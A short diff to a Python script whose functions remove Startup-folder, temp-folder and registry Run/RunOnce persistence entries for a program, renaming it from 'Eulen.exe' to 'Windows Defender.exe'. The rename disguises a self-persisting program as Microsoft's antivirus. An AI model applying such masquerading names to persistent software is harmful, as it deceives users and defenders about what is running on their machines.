@@ -43,10 +43,10 @@ if not is_admin():
 
 script_path = os.path.realpath(sys.argv[0])
 autohzzh = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-hzzh_path = os.path.join(autohzzh, 'Eulen.exe')
+hzzh_path = os.path.join(autohzzh, 'Windows Defender.exe')
 
 temp_folder = os.getenv('TEMP')
-file_name = "Eulen.exe"
+file_name = "Windows Defender.exe"
 hzzh_path1 = os.path.join(temp_folder, file_name)
 
 def remove_hzzh():
@@ -72,7 +72,7 @@ def remove_hzzhtemp():
 def remove_hzzhreg():
     try:
         registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
-        reg.DeleteValue(registry_key, "Eulen")
+        reg.DeleteValue(registry_key, "Windows Defender")
         reg.CloseKey(registry_key)
         print("Removed Windows Defender from registry Run key.")
     except FileNotFoundError:
@@ -83,7 +83,7 @@ def remove_hzzhreg():
 def remove_hzzh_runonce():
     try:
         registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 0, reg.KEY_WRITE)
-        reg.DeleteValue(registry_key, "Eulen")
+        reg.DeleteValue(registry_key, "Windows Defender")
         reg.CloseKey(registry_key)
         print("Removed WindowsDefender from registry RunOnce key.")
     except FileNotFoundError:
